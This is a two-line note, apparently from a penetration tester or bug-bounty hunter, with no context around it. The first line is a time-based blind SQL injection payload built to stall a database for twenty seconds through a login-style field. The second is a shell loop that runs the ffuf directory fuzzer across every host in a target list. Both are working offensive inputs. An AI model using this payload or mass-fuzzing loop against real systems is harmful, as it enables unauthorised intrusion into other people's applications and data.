admin'XOR(if(now()=sysdate(),sleep(20),0))XOR'
for i in $(cat list.txt); do ffuf -w word.txt -u https://$i/FUZZ  -o $i.txt; done 
